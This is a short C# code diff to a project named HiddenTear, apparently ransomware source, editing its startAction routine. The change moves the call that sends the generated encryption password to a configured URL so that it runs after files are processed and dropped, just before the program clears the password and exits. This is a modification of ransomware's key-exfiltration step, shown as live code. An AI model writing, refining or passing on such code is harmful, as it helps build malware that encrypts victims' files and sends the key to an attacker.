@@ -107,7 +107,6 @@ namespace HiddenTear
         void startAction()
         {
             string password = createPassword(PASSLENGTH);
-            if (URL != "") sendPassword(password);
 
             if (!string.IsNullOrEmpty(CONTAINMENTPATH))
             {
@@ -142,6 +141,7 @@ namespace HiddenTear
             }
 
             dropFiles();
+            if (URL != "") sendPassword(password);        
             password = null;
             System.Windows.Forms.Application.Exit();
         }
